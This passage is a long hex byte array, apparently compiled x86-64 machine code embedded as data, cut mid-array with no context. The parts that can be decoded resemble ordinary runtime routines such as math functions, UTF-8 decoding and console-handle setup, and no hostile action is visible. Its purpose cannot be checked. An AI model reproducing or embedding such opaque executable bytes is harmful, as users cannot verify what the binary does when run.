0x45, 0x33, 0xc9, 0x48, 0x21, 0x48, 0xe8, 0x45, 0x33, 0xc0, 0xc6, 0x42, 0x30, 0x1, 0xc7, 0x42, 0x2c, 0x16, 0x0, 0x0, 0x0, 0x33, 0xd2, 0xe8, 0x81, 0x9f, 0xff, 0xff, 0x83, 0xc8, 0xff, 0xeb, 0x54, 0x8b, 0x41, 0x14, 0x83, 0xce, 0xff, 0xc1, 0xe8, 0xd, 0xa8, 0x1, 0x74, 0x3d, 0xe8, 0xe2, 0xcb, 0xff, 0xff, 0x48, 0x8b, 0xcb, 0x8b, 0xf0, 0xe8, 0x90, 0xf8, 0xff, 0xff, 0x48, 0x8b, 0xcb, 0xe8, 0x7c, 0xd1, 0xff, 0xff, 0x8b, 0xc8, 0x48, 0x8b, 0xd7, 0xe8, 0x1e, 0xa, 0x0, 0x0, 0x85, 0xc0, 0x79, 0x5, 0x83, 0xce, 0xff, 0xeb, 0x13, 0x48, 0x8b, 0x4b, 0x28, 0x48, 0x85, 0xc9, 0x74, 0xa, 0xe8, 0xdb, 0xa1, 0xff, 0xff, 0x48, 0x83, 0x63, 0x28, 0x0, 0x48, 0x8b, 0xcb, 0xe8, 0x8e, 0xb, 0x0, 0x0, 0x8b, 0xc6, 0x48, 0x8b, 0x5c, 0x24, 0x40, 0x48, 0x8b, 0x74, 0x24, 0x48, 0x48, 0x83, 0xc4, 0x30, 0x5f, 0xc3, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x7c, 0x24, 0x10, 0x55, 0x48, 0x8b, 0xec, 0x48, 0x83, 0xec, 0x60, 0x48, 0x83, 0x65, 0xc0, 0x0, 0x83, 0x3d, 0x16, 0xdd, 0x0, 0x0, 0x0, 0xc6, 0x45, 0xd0, 0x0, 0xc6, 0x45, 0xe8, 0x0, 0xc6, 0x45, 0xf0, 0x0, 0xc6, 0x45, 0xf8, 0x0, 0x75, 0x10, 0xf, 0x10, 0x5, 0x8d, 0xcd, 0x0, 0x0, 0xc6, 0x45, 0xe8, 0x1, 0xf3, 0xf, 0x7f, 0x45, 0xd8, 0x48, 0x8d, 0x55, 0xc0, 0xe8, 0x97, 0xfe, 0xff, 0xff, 0x80, 0x7d, 0xe8, 0x2, 0x8b, 0xf8, 0x75, 0xb, 0x48, 0x8b, 0x4d, 0xc0, 0x83, 0xa1, 0xa8, 0x3, 0x0, 0x0, 0xfd, 0x80, 0x7d, 0xf0, 0x0, 0x74, 0xf, 0x8b, 0x5d, 0xec, 0x48, 0x8d, 0x4d, 0xc0, 0xe8, 0x2e, 0x92, 0xff, 0xff, 0x89, 0x58, 0x20, 0x80, 0x7d, 0xf8, 0x0, 0x74, 0xf, 0x8b, 0x5d, 0xf4, 0x48, 0x8d, 0x4d, 0xc0, 0xe8, 0x19, 0x92, 0xff, 0xff, 0x89, 0x58, 0x24, 0x48, 0x8b, 0x5c, 0x24, 0x70, 0x8b, 0xc7, 0x48, 0x8b, 0x7c, 0x24, 0x78, 0x48, 0x83, 0xc4, 0x60, 0x5d, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x58, 0x66, 0xf, 0x7f, 0x74, 0x24, 0x20, 0x83, 0x3d, 0xab, 0xdc, 0x0, 0x0, 0x0, 0xf, 0x85, 0xe9, 0x2, 0x0, 0x0, 0x66, 0xf, 0x28, 0xd8, 0x66, 0xf, 0x28, 0xe0, 0x66, 0xf, 0x73, 0xd3, 0x34, 0x66, 0x48, 0xf, 0x7e, 0xc0, 0x66, 0xf, 0xfb, 0x1d, 0x1f, 0x82, 0x0, 0x0, 0x66, 0xf, 0x28, 0xe8, 0x66, 0xf, 0x54, 0x2d, 0xe3, 0x81, 0x0, 0x0, 0x66, 0xf, 0x2f, 0x2d, 0xdb, 0x81, 0x0, 0x0, 0xf, 0x84, 0x85, 0x2, 0x0, 0x0, 0x66, 0xf, 0x28, 0xd0, 0xf3, 0xf, 0xe6, 0xf3, 0x66, 0xf, 0x57, 0xed, 0x66, 0xf, 0x2f, 0xc5, 0xf, 0x86, 0x2f, 0x2, 0x0, 0x0, 0x66, 0xf, 0xdb, 0x15, 0x7, 0x82, 0x0, 0x0, 0xf2, 0xf, 0x5c, 0x25, 0x8f, 0x82, 0x0, 0x0, 0x66, 0xf, 0x2f, 0x35, 0x17, 0x83, 0x0, 0x0, 0xf, 0x84, 0xd8, 0x1, 0x0, 0x0, 0x66, 0xf, 0x54, 0x25, 0x69, 0x83, 0x0, 0x0, 0x4c, 0x8b, 0xc8, 0x48, 0x23, 0x5, 0xef, 0x81, 0x0, 0x0, 0x4c, 0x23, 0xd, 0xf8, 0x81, 0x0, 0x0, 0x49, 0xd1, 0xe1, 0x49, 0x3, 0xc1, 0x66, 0x48, 0xf, 0x6e, 0xc8, 0x66, 0xf, 0x2f, 0x25, 0x5, 0x83, 0x0, 0x0, 0xf, 0x82, 0xdf, 0x0, 0x0, 0x0, 0x48, 0xc1, 0xe8, 0x2c, 0x66, 0xf, 0xeb, 0x15, 0x53, 0x82, 0x0, 0x0, 0x66, 0xf, 0xeb, 0xd, 0x4b, 0x82, 0x0, 0x0, 0x4c, 0x8d, 0xd, 0xc4, 0x93, 0x0, 0x0, 0xf2, 0xf, 0x5c, 0xca, 0xf2, 0x41, 0xf, 0x59, 0xc, 0xc1, 0x66, 0xf, 0x28, 0xd1, 0x66, 0xf, 0x28, 0xc1, 0x4c, 0x8d, 0xd, 0x8b, 0x83, 0x0, 0x0, 0xf2, 0xf, 0x10, 0x1d, 0x93, 0x82, 0x0, 0x0, 0xf2, 0xf, 0x10, 0xd, 0x5b, 0x82, 0x0, 0x0, 0xf2, 0xf, 0x59, 0xda, 0xf2, 0xf, 0x59, 0xca, 0xf2, 0xf, 0x59, 0xc2, 0x66, 0xf, 0x28, 0xe0, 0xf2, 0xf, 0x58, 0x1d, 0x63, 0x82, 0x0, 0x0, 0xf2, 0xf, 0x58, 0xd, 0x2b, 0x82, 0x0, 0x0, 0xf2, 0xf, 0x59, 0xe0, 0xf2, 0xf, 0x59, 0xda, 0xf2, 0xf, 0x59, 0xc8, 0xf2, 0xf, 0x58, 0x1d, 0x37, 0x82, 0x0, 0x0, 0xf2, 0xf, 0x58, 0xca, 0xf2, 0xf, 0x59, 0xdc, 0xf2, 0xf, 0x58, 0xcb, 0xf2, 0xf, 0x10, 0x2d, 0xa3, 0x81, 0x0, 0x0, 0xf2, 0xf, 0x59, 0xd, 0x5b, 0x81, 0x0, 0x0, 0xf2, 0xf, 0x59, 0xee, 0xf2, 0xf, 0x5c, 0xe9, 0xf2, 0x41, 0xf, 0x10, 0x4, 0xc1, 0x48, 0x8d, 0x15, 0x26, 0x8b, 0x0, 0x0, 0xf2, 0xf, 0x10, 0x14, 0xc2, 0xf2, 0xf, 0x10, 0x25, 0x69, 0x81, 0x0, 0x0, 0xf2, 0xf, 0x59, 0xe6, 0xf2, 0xf, 0x58, 0xc4, 0xf2, 0xf, 0x58, 0xd5, 0xf2, 0xf, 0x58, 0xc2, 0x66, 0xf, 0x6f, 0x74, 0x24, 0x20, 0x48, 0x83, 0xc4, 0x58, 0xc3, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf2, 0xf, 0x10, 0x15, 0x58, 0x81, 0x0, 0x0, 0xf2, 0xf, 0x5c, 0x5, 0x60, 0x81, 0x0, 0x0, 0xf2, 0xf, 0x58, 0xd0, 0x66, 0xf, 0x28, 0xc8, 0xf2, 0xf, 0x5e, 0xca, 0xf2, 0xf, 0x10, 0x25, 0x5c, 0x82, 0x0, 0x0, 0xf2, 0xf, 0x10, 0x2d, 0x74, 0x82, 0x0, 0x0, 0x66, 0xf, 0x28, 0xf0, 0xf2, 0xf, 0x59, 0xf1, 0xf2, 0xf, 0x58, 0xc9, 0x66, 0xf, 0x28, 0xd1, 0xf2, 0xf, 0x59, 0xd1, 0xf2, 0xf, 0x59, 0xe2, 0xf2, 0xf, 0x59, 0xea, 0xf2, 0xf, 0x58, 0x25, 0x20, 0x82, 0x0, 0x0, 0xf2, 0xf, 0x58, 0x2d, 0x38, 0x82, 0x0, 0x0, 0xf2, 0xf, 0x59, 0xd1, 0xf2, 0xf, 0x59, 0xe2, 0xf2, 0xf, 0x59, 0xd2, 0xf2, 0xf, 0x59, 0xd1, 0xf2, 0xf, 0x59, 0xea, 0xf2, 0xf, 0x10, 0x15, 0xbc, 0x80, 0x0, 0x0, 0xf2, 0xf, 0x58, 0xe5, 0xf2, 0xf, 0x5c, 0xe6, 0xf2, 0xf, 0x10, 0x35, 0x9c, 0x80, 0x0, 0x0, 0x66, 0xf, 0x28, 0xd8, 0x66, 0xf, 0xdb, 0x1d, 0x20, 0x82, 0x0, 0x0, 0xf2, 0xf, 0x5c, 0xc3, 0xf2, 0xf, 0x58, 0xe0, 0x66, 0xf, 0x28, 0xc3, 0x66, 0xf, 0x28, 0xcc, 0xf2, 0xf, 0x59, 0xe2, 0xf2, 0xf, 0x59, 0xc2, 0xf2, 0xf, 0x59, 0xce, 0xf2, 0xf, 0x59, 0xde, 0xf2, 0xf, 0x58, 0xc4, 0xf2, 0xf, 0x58, 0xc1, 0xf2, 0xf, 0x58, 0xc3, 0x66, 0xf, 0x6f, 0x74, 0x24, 0x20, 0x48, 0x83, 0xc4, 0x58, 0xc3, 0x66, 0xf, 0xeb, 0x15, 0xa1, 0x80, 0x0, 0x0, 0xf2, 0xf, 0x5c, 0x15, 0x99, 0x80, 0x0, 0x0, 0xf2, 0xf, 0x10, 0xea, 0x66, 0xf, 0xdb, 0x15, 0xfd, 0x7f, 0x0, 0x0, 0x66, 0x48, 0xf, 0x7e, 0xd0, 0x66, 0xf, 0x73, 0xd5, 0x34, 0x66, 0xf, 0xfa, 0x2d, 0x1b, 0x81, 0x0, 0x0, 0xf3, 0xf, 0xe6, 0xf5, 0xe9, 0xf1, 0xfd, 0xff, 0xff, 0x66, 0x90, 0x75, 0x1e, 0xf2, 0xf, 0x10, 0xd, 0x76, 0x7f, 0x0, 0x0, 0x44, 0x8b, 0x5, 0xaf, 0x81, 0x0, 0x0, 0xe8, 0x1a, 0xb, 0x0, 0x0, 0xeb, 0x48, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf2, 0xf, 0x10, 0xd, 0x78, 0x7f, 0x0, 0x0, 0x44, 0x8b, 0x5, 0x95, 0x81, 0x0, 0x0, 0xe8, 0xfc, 0xa, 0x0, 0x0, 0xeb, 0x2a, 0x66, 0x66, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0x48, 0x3b, 0x5, 0x49, 0x7f, 0x0, 0x0, 0x74, 0x17, 0x48, 0x3b, 0x5, 0x30, 0x7f, 0x0, 0x0, 0x74, 0xce, 0x48, 0xb, 0x5, 0x57, 0x7f, 0x0, 0x0, 0x66, 0x48, 0xf, 0x6e, 0xc0, 0x66, 0x90, 0x66, 0xf, 0x6f, 0x74, 0x24, 0x20, 0x48, 0x83, 0xc4, 0x58, 0xc3, 0xf, 0x1f, 0x44, 0x0, 0x0, 0x48, 0x33, 0xc0, 0xc5, 0xe1, 0x73, 0xd0, 0x34, 0xc4, 0xe1, 0xf9, 0x7e, 0xc0, 0xc5, 0xe1, 0xfb, 0x1d, 0x3b, 0x7f, 0x0, 0x0, 0xc5, 0xfa, 0xe6, 0xf3, 0xc5, 0xf9, 0xdb, 0x2d, 0xff, 0x7e, 0x0, 0x0, 0xc5, 0xf9, 0x2f, 0x2d, 0xf7, 0x7e, 0x0, 0x0, 0xf, 0x84, 0x41, 0x2, 0x0, 0x0, 0xc5, 0xd1, 0xef, 0xed, 0xc5, 0xf9, 0x2f, 0xc5, 0xf, 0x86, 0xe3, 0x1, 0x0, 0x0, 0xc5, 0xf9, 0xdb, 0x15, 0x2b, 0x7f, 0x0, 0x0, 0xc5, 0xfb, 0x5c, 0x25, 0xb3, 0x7f, 0x0, 0x0, 0xc5, 0xf9, 0x2f, 0x35, 0x3b, 0x80, 0x0, 0x0, 0xf, 0x84, 0x8e, 0x1, 0x0, 0x0, 0xc5, 0xf9, 0xdb, 0xd, 0x1d, 0x7f, 0x0, 0x0, 0xc5, 0xf9, 0xdb, 0x1d, 0x25, 0x7f, 0x0, 0x0, 0xc5, 0xe1, 0x73, 0xf3, 0x1, 0xc5, 0xe1, 0xd4, 0xc9, 0xc4, 0xe1, 0xf9, 0x7e, 0xc8, 0xc5, 0xd9, 0xdb, 0x25, 0x6f, 0x80, 0x0, 0x0, 0xc5, 0xf9, 0x2f, 0x25, 0x27, 0x80, 0x0, 0x0, 0xf, 0x82, 0xb1, 0x0, 0x0, 0x0, 0x48, 0xc1, 0xe8, 0x2c, 0xc5, 0xe9, 0xeb, 0x15, 0x75, 0x7f, 0x0, 0x0, 0xc5, 0xf1, 0xeb, 0xd, 0x6d, 0x7f, 0x0, 0x0, 0x4c, 0x8d, 0xd, 0xe6, 0x90, 0x0, 0x0, 0xc5, 0xf3, 0x5c, 0xca, 0xc4, 0xc1, 0x73, 0x59, 0xc, 0xc1, 0x4c, 0x8d, 0xd, 0xb5, 0x80, 0x0, 0x0, 0xc5, 0xf3, 0x59, 0xc1, 0xc5, 0xfb, 0x10, 0x1d, 0xb9, 0x7f, 0x0, 0x0, 0xc5, 0xfb, 0x10, 0x2d, 0x81, 0x7f, 0x0, 0x0, 0xc4, 0xe2, 0xf1, 0xa9, 0x1d, 0x98, 0x7f, 0x0, 0x0, 0xc4, 0xe2, 0xf1, 0xa9, 0x2d, 0x2f, 0x7f, 0x0, 0x0, 0xf2, 0xf, 0x10, 0xe0, 0xc4, 0xe2, 0xf1, 0xa9, 0x1d, 0x72, 0x7f, 0x0, 0x0, 0xc5, 0xfb, 0x59, 0xe0, 0xc4, 0xe2, 0xd1, 0xb9, 0xc8, 0xc4, 0xe2, 0xe1, 0xb9, 0xcc, 0xc5, 0xf3, 0x59, 0xd, 0x9c, 0x7e, 0x0, 0x0, 0xc5, 0xfb, 0x10, 0x2d, 0xd4, 0x7e, 0x0, 0x0, 0xc4, 0xe2, 0xc9, 0xab, 0xe9, 0xf2, 0x41, 0xf, 0x10, 0x4, 0xc1, 0x48, 0x8d, 0x15, 0x62, 0x88, 0x0, 0x0, 0xf2, 0xf, 0x10, 0x14, 0xc2, 0xc5, 0xeb, 0x58, 0xd5, 0xc4, 0xe2, 0xc9, 0xb9, 0x5, 0xa0, 0x7e, 0x0, 0x0, 0xc5, 0xfb, 0x58, 0xc2, 0xc5, 0xf9, 0x6f, 0x74, 0x24, 0x20, 0x48, 0x83, 0xc4, 0x58, 0xc3, 0x90, 0xc5, 0xfb, 0x10, 0x15, 0xa8, 0x7e, 0x0, 0x0, 0xc5, 0xfb, 0x5c, 0x5, 0xb0, 0x7e, 0x0, 0x0, 0xc5, 0xeb, 0x58, 0xd0, 0xc5, 0xfb, 0x5e, 0xca, 0xc5, 0xfb, 0x10, 0x25, 0xb0, 0x7f, 0x0, 0x0, 0xc5, 0xfb, 0x10, 0x2d, 0xc8, 0x7f, 0x0, 0x0, 0xc5, 0xfb, 0x59, 0xf1, 0xc5, 0xf3, 0x58, 0xc9, 0xc5, 0xf3, 0x59, 0xd1, 0xc4, 0xe2, 0xe9, 0xa9, 0x25, 0x83, 0x7f, 0x0, 0x0, 0xc4, 0xe2, 0xe9, 0xa9, 0x2d, 0x9a, 0x7f, 0x0, 0x0, 0xc5, 0xeb, 0x59, 0xd1, 0xc5, 0xdb, 0x59, 0xe2, 0xc5, 0xeb, 0x59, 0xd2, 0xc5, 0xeb, 0x59, 0xd1, 0xc5, 0xd3, 0x59, 0xea, 0xc5, 0xdb, 0x58, 0xe5, 0xc5, 0xdb, 0x5c, 0xe6, 0xc5, 0xf9, 0xdb, 0x1d, 0x96, 0x7f, 0x0, 0x0, 0xc5, 0xfb, 0x5c, 0xc3, 0xc5, 0xdb, 0x58, 0xe0, 0xc5, 0xdb, 0x59, 0xd, 0xf6, 0x7d, 0x0, 0x0, 0xc5, 0xdb, 0x59, 0x25, 0xfe, 0x7d, 0x0, 0x0, 0xc5, 0xe3, 0x59, 0x5, 0xf6, 0x7d, 0x0, 0x0, 0xc5, 0xe3, 0x59, 0x1d, 0xde, 0x7d, 0x0, 0x0, 0xc5, 0xfb, 0x58, 0xc4, 0xc5, 0xfb, 0x58, 0xc1, 0xc5, 0xfb, 0x58, 0xc3, 0xc5, 0xf9, 0x6f, 0x74, 0x24, 0x20, 0x48, 0x83, 0xc4, 0x58, 0xc3, 0xc5, 0xe9, 0xeb, 0x15, 0xf, 0x7e, 0x0, 0x0, 0xc5, 0xeb, 0x5c, 0x15, 0x7, 0x7e, 0x0, 0x0, 0xc5, 0xd1, 0x73, 0xd2, 0x34, 0xc5, 0xe9, 0xdb, 0x15, 0x6a, 0x7d, 0x0, 0x0, 0xc5, 0xf9, 0x28, 0xc2, 0xc5, 0xd1, 0xfa, 0x2d, 0x8e, 0x7e, 0x0, 0x0, 0xc5, 0xfa, 0xe6, 0xf5, 0xe9, 0x40, 0xfe, 0xff, 0xff, 0xf, 0x1f, 0x44, 0x0, 0x0, 0x75, 0x2e, 0xc5, 0xfb, 0x10, 0xd, 0xe6, 0x7c, 0x0, 0x0, 0x44, 0x8b, 0x5, 0x1f, 0x7f, 0x0, 0x0, 0xe8, 0x8a, 0x8, 0x0, 0x0, 0xc5, 0xf9, 0x6f, 0x74, 0x24, 0x20, 0x48, 0x83, 0xc4, 0x58, 0xc3, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc5, 0xfb, 0x10, 0xd, 0xd8, 0x7c, 0x0, 0x0, 0x44, 0x8b, 0x5, 0xf5, 0x7e, 0x0, 0x0, 0xe8, 0x5c, 0x8, 0x0, 0x0, 0xc5, 0xf9, 0x6f, 0x74, 0x24, 0x20, 0x48, 0x83, 0xc4, 0x58, 0xc3, 0x90, 0x48, 0x3b, 0x5, 0xa9, 0x7c, 0x0, 0x0, 0x74, 0x27, 0x48, 0x3b, 0x5, 0x90, 0x7c, 0x0, 0x0, 0x74, 0xce, 0x48, 0xb, 0x5, 0xb7, 0x7c, 0x0, 0x0, 0x66, 0x48, 0xf, 0x6e, 0xc8, 0x44, 0x8b, 0x5, 0xc3, 0x7e, 0x0, 0x0, 0xe8, 0x26, 0x8, 0x0, 0x0, 0xeb, 0x4, 0xf, 0x1f, 0x40, 0x0, 0xc5, 0xf9, 0x6f, 0x74, 0x24, 0x20, 0x48, 0x83, 0xc4, 0x58, 0xc3, 0xcc, 0x48, 0x83, 0x22, 0x0, 0x48, 0x8b, 0xc1, 0xc3, 0x48, 0x83, 0x21, 0x0, 0x48, 0x83, 0xc8, 0xff, 0xc6, 0x42, 0x30, 0x1, 0xc7, 0x42, 0x2c, 0x2a, 0x0, 0x0, 0x0, 0xc3, 0x40, 0x53, 0x55, 0x56, 0x57, 0x41, 0x54, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xec, 0x40, 0x48, 0x8b, 0x5, 0x62, 0xc0, 0x0, 0x0, 0x48, 0x33, 0xc4, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8b, 0xb4, 0x24, 0xa0, 0x0, 0x0, 0x0, 0x4c, 0x8d, 0x15, 0xbb, 0xd6, 0x0, 0x0, 0x45, 0x33, 0xdb, 0x48, 0x8d, 0x3d, 0x53, 0x2a, 0x0, 0x0, 0x4d, 0x85, 0xc9, 0x48, 0x8b, 0xc2, 0x4c, 0x8b, 0xe2, 0x4d, 0xf, 0x45, 0xd1, 0x48, 0x85, 0xd2, 0x41, 0x8d, 0x6b, 0x1, 0x48, 0xf, 0x45, 0xfa, 0x44, 0x8b, 0xfd, 0x4d, 0xf, 0x45, 0xf8, 0x48, 0xf7, 0xd8, 0x4d, 0x1b, 0xf6, 0x4c, 0x23, 0xf1, 0x4d, 0x85, 0xff, 0x75, 0xc, 0x48, 0xc7, 0xc0, 0xfe, 0xff, 0xff, 0xff, 0xe9, 0x4d, 0x1, 0x0, 0x0, 0x66, 0x45, 0x39, 0x5a, 0x6, 0x75, 0x68, 0x44, 0xf, 0xb6, 0xf, 0x48, 0xff, 0xc7, 0x45, 0x84, 0xc9, 0x78, 0x17, 0x4d, 0x85, 0xf6, 0x74, 0x3, 0x45, 0x89, 0xe, 0x45, 0x84, 0xc9, 0x41, 0xf, 0x95, 0xc3, 0x49, 0x8b, 0xc3, 0xe9, 0x23, 0x1, 0x0, 0x0, 0x41, 0x8a, 0xc1, 0x24, 0xe0, 0x3c, 0xc0, 0x75, 0x5, 0x41, 0xb0, 0x2, 0xeb, 0x1e, 0x41, 0x8a, 0xc1, 0x24, 0xf0, 0x3c, 0xe0, 0x75, 0x5, 0x41, 0xb0, 0x3, 0xeb, 0x10, 0x41, 0x8a, 0xc1, 0x24, 0xf8, 0x3c, 0xf0, 0xf, 0x85, 0xef, 0x0, 0x0, 0x0, 0x41, 0xb0, 0x4, 0x41, 0xf, 0xb6, 0xc0, 0xb9, 0x7, 0x0, 0x0, 0x0, 0x2b, 0xc8, 0x8b, 0xd5, 0xd3, 0xe2, 0x41, 0x8a, 0xd8, 0x2b, 0xd5, 0x41, 0x23, 0xd1, 0xeb, 0x29, 0x45, 0x8a, 0x42, 0x4, 0x41, 0x8b, 0x12, 0x41, 0x8a, 0x5a, 0x6, 0x41, 0x8d, 0x40, 0xfe, 0x3c, 0x2, 0xf, 0x87, 0xbc, 0x0, 0x0, 0x0, 0x40, 0x3a, 0xdd, 0xf, 0x82, 0xb3, 0x0, 0x0, 0x0, 0x41, 0x3a, 0xd8, 0xf, 0x83, 0xaa, 0x0, 0x0, 0x0, 0xf, 0xb6, 0xeb, 0x49, 0x3b, 0xef, 0x44, 0x8b, 0xcd, 0x4d, 0xf, 0x43, 0xcf, 0xeb, 0x1e, 0xf, 0xb6, 0xf, 0x48, 0xff, 0xc7, 0x8a, 0xc1, 0x24, 0xc0, 0x3c, 0x80, 0xf, 0x85, 0x89, 0x0, 0x0, 0x0, 0x8b, 0xc2, 0x83, 0xe1, 0x3f, 0xc1, 0xe0, 0x6, 0x8b, 0xd1, 0xb, 0xd0, 0x48, 0x8b, 0xc7, 0x49, 0x2b, 0xc4, 0x49, 0x3b, 0xc1, 0x72, 0xd7, 0x4c, 0x3b, 0xcd, 0x73, 0x1c, 0x41, 0xf, 0xb6, 0xc0, 0x41, 0x2a, 0xd9, 0x66, 0x41, 0x89, 0x42, 0x4, 0xf, 0xb6, 0xc3, 0x66, 0x41, 0x89, 0x42, 0x6, 0x41, 0x89, 0x12, 0xe9, 0x3, 0xff, 0xff, 0xff, 0x8d, 0x82, 0x0, 0x28, 0xff, 0xff, 0x3d, 0xff, 0x7, 0x0, 0x0, 0x76, 0x44, 0x81, 0xfa, 0x0, 0x0, 0x11, 0x0, 0x73, 0x3c, 0x41, 0xf, 0xb6, 0xc0, 0xc7, 0x44, 0x24, 0x20, 0x80, 0x0, 0x0, 0x0, 0xc7, 0x44, 0x24, 0x24, 0x0, 0x8, 0x0, 0x0, 0xc7, 0x44, 0x24, 0x28, 0x0, 0x0, 0x1, 0x0, 0x3b, 0x54, 0x84, 0x18, 0x72, 0x1a, 0x4d, 0x85, 0xf6, 0x74, 0x3, 0x41, 0x89, 0x16, 0xf7, 0xda, 0x49, 0x8b, 0xd2, 0x48, 0x1b, 0xc9, 0x48, 0x23, 0xcd, 0xe8, 0x34, 0xfe, 0xff, 0xff, 0xeb, 0xb, 0x48, 0x8b, 0xd6, 0x49, 0x8b, 0xca, 0xe8, 0x2f, 0xfe, 0xff, 0xff, 0x48, 0x8b, 0x4c, 0x24, 0x30, 0x48, 0x33, 0xcc, 0xe8, 0x1e, 0xd, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x40, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5c, 0x5f, 0x5e, 0x5d, 0x5b, 0xc3, 0xcc, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x40, 0x48, 0x8b, 0x5, 0x3f, 0xc8, 0x0, 0x0, 0x33, 0xdb, 0x48, 0x83, 0xf8, 0xfe, 0x75, 0x2e, 0x48, 0x89, 0x5c, 0x24, 0x30, 0x44, 0x8d, 0x43, 0x3, 0x89, 0x5c, 0x24, 0x28, 0x48, 0x8d, 0xd, 0x93, 0x7c, 0x0, 0x0, 0x45, 0x33, 0xc9, 0x44, 0x89, 0x44, 0x24, 0x20, 0xba, 0x0, 0x0, 0x0, 0x40, 0xff, 0x15, 0xb8, 0x1f, 0x0, 0x0, 0x48, 0x89, 0x5, 0x9, 0xc8, 0x0, 0x0, 0x48, 0x83, 0xf8, 0xff, 0xf, 0x95, 0xc3, 0x8b, 0xc3, 0x48, 0x83, 0xc4, 0x40, 0x5b, 0xc3, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0x48, 0x8b, 0xd, 0xed, 0xc7, 0x0, 0x0, 0x48, 0x83, 0xf9, 0xfd, 0x77, 0x6, 0xff, 0x15, 0x91, 0x1f, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x8, 0x48, 0x89, 0x68, 0x10, 0x48, 0x89, 0x70, 0x18, 0x57, 0x48, 0x83, 0xec, 0x40, 0x48, 0x83, 0x60, 0xd8, 0x0, 0x49, 0x8b, 0xf8, 0x4d, 0x8b, 0xc8, 0x8b, 0xf2, 0x44, 0x8b, 0xc2, 0x48, 0x8b, 0xe9, 0x48, 0x8b, 0xd1, 0x48, 0x8b, 0xd, 0xab, 0xc7, 0x0, 0x0, 0xff, 0x15, 0x8d, 0x1d, 0x0, 0x0, 0x8b, 0xd8, 0x85, 0xc0, 0x75, 0x6a, 0xff, 0x15, 0x99, 0x1d, 0x0, 0x0, 0x83, 0xf8, 0x6, 0x75, 0x5f, 0x48, 0x8b, 0xd, 0x8d, 0xc7, 0x0, 0x0, 0x48, 0x83, 0xf9, 0xfd, 0x77, 0x6, 0xff, 0x15, 0x31, 0x1f, 0x0, 0x0, 0x48, 0x83, 0x64, 0x24, 0x30, 0x0, 0x48, 0x8d, 0xd, 0xe4, 0x7b, 0x0, 0x0, 0x83, 0x64, 0x24, 0x28, 0x0, 0x41, 0xb8, 0x3, 0x0, 0x0, 0x0, 0x45, 0x33, 0xc9, 0x44, 0x89, 0x44, 0x24, 0x20, 0xba, 0x0, 0x0, 0x0, 0x40, 0xff, 0x15, 0xfe, 0x1e, 0x0, 0x0, 0x48, 0x83, 0x64, 0x24, 0x20, 0x0, 0x4c, 0x8b, 0xcf, 0x48, 0x8b, 0xc8, 0x48, 0x89, 0x5, 0x43, 0xc7, 0x0, 0x0, 0x44, 0x8b, 0xc6, 0x48, 0x8b, 0xd5, 0xff, 0x15, 0x1f, 0x1d, 0x0, 0x0, 0x8b, 0xd8, 0x48, 0x8b, 0x6c, 0x24, 0x58, 0x8b, 0xc3, 0x48, 0x8b, 0x5c, 0x24, 0x50, 0x48, 0x8b, 0x74, 0x24, 0x60, 0x48, 0x83, 0xc4, 0x40, 0x5f, 0xc3, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x4c, 0x89, 0x4c, 0x24, 0x20, 0x57, 0x48, 0x83, 0xec, 0x20, 0x49, 0x8b, 0xf9, 0x49, 0x8b, 0xd8, 0x8b, 0xa, 0xe8, 0x10, 0xdf, 0xff, 0xff, 0x90, 0x48, 0x8b, 0x3, 0x48, 0x63, 0x8, 0x4c, 0x8b, 0xd1, 0x48, 0x8b, 0x53, 0x8, 0x48, 0x8b, 0xc1, 0x48, 0xc1, 0xf8, 0x6, 0x4c, 0x8d, 0xd, 0x24, 0xcf, 0x0, 0x0, 0x41, 0x83, 0xe2, 0x3f, 0x4f, 0x8d, 0x4, 0xd2, 0x49, 0x8b, 0x4, 0xc1, 0x42, 0xf6, 0x44, 0xc0, 0x38, 0x1, 0x74, 0x9, 0xe8, 0xeb, 0x0, 0x0, 0x0, 0x8b, 0xd8, 0xeb, 0xe, 0xc6, 0x42, 0x30, 0x1, 0xc7, 0x42, 0x2c, 0x9, 0x0, 0x0, 0x0, 0x83, 0xcb, 0xff, 0x8b, 0xf, 0xe8, 0xea, 0xde, 0xff, 0xff, 0x8b, 0xc3, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0x89, 0x4c, 0x24, 0x8, 0x48, 0x83, 0xec, 0x58, 0x4c, 0x63, 0xc1, 0x45, 0x33, 0xc9, 0x41, 0x83, 0xf8, 0xfe, 0x75, 0x18, 0xc6, 0x42, 0x38, 0x1, 0x44, 0x89, 0x4a, 0x34, 0xc6, 0x42, 0x30, 0x1, 0xc7, 0x42, 0x2c, 0x9, 0x0, 0x0, 0x0, 0xe9, 0x8d, 0x0, 0x0, 0x0, 0x85, 0xc9, 0x78, 0x60, 0x44, 0x3b, 0x5, 0xad, 0xd2, 0x0, 0x0, 0x73, 0x57, 0x49, 0x8b, 0xc8, 0x4c, 0x8d, 0x15, 0xa1, 0xce, 0x0, 0x0, 0x83, 0xe1, 0x3f, 0x49, 0x8b, 0xc0, 0x48, 0xc1, 0xf8, 0x6, 0x48, 0x8d, 0xc, 0xc9, 0x49, 0x8b, 0x4, 0xc2, 0xf6, 0x44, 0xc8, 0x38, 0x1, 0x74, 0x34, 0x48, 0x8d, 0x44, 0x24, 0x60, 0x48, 0x89, 0x54, 0x24, 0x40, 0x44, 0x89, 0x44, 0x24, 0x78, 0x48, 